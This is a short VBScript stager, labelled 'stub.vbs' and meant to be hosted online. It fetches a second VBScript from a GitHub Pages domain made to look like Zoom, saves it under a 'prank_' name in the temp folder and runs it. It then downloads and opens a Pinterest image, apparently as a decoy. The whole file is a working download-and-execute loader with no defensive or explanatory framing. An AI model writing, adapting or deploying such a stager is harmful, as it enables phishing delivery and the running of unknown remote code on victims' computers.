' ============================================
' stub.vbs - Host this file online
' ============================================
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
tempFolder = objFSO.GetSpecialFolder(2)

' ---------- CONFIGURE THESE URLS ----------
remoteVBS_URL = "https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/document.vbs"
remoteImage_URL = "https://i.pinimg.com/736x/47/1b/89/471b89ad7e1d0876f368e63da6f0cd66.jpg"
' ------------------------------------------

' 1. Download the remote VBS
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", remoteVBS_URL, False
http.Send
If http.Status <> 200 Then MsgBox "VBS download failed", vbCritical: WScript.Quit

vbsTempFile = objFSO.BuildPath(tempFolder, "prank_" & Replace(CStr(Timer), ".", "") & ".vbs")
Set f = objFSO.CreateTextFile(vbsTempFile, True)
f.Write http.responseText
f.Close

' 2. Run the VBS and WAIT for it to finish
objShell.Run "wscript.exe " & Chr(34) & vbsTempFile & Chr(34), 1, True

' 3. Download the image (binary data)
http.Open "GET", remoteImage_URL, False
http.Send
If http.Status = 200 Then
    imageTempFile = objFSO.BuildPath(tempFolder, "image_" & Replace(CStr(Timer), ".", "") & ".jpg")
    Dim adoStream
    Set adoStream = CreateObject("ADODB.Stream")
    adoStream.Type = 1  ' adTypeBinary
    adoStream.Open
    adoStream.Write http.responseBody
    adoStream.SaveToFile imageTempFile, 2  ' adSaveCreateOverWrite
    adoStream.Close
    ' 4. Display the image in the default viewer
    objShell.Run Chr(34) & imageTempFile & Chr(34), 1, False
Else
    MsgBox "Image download failed. HTTP " & http.Status, vbExclamation
End If
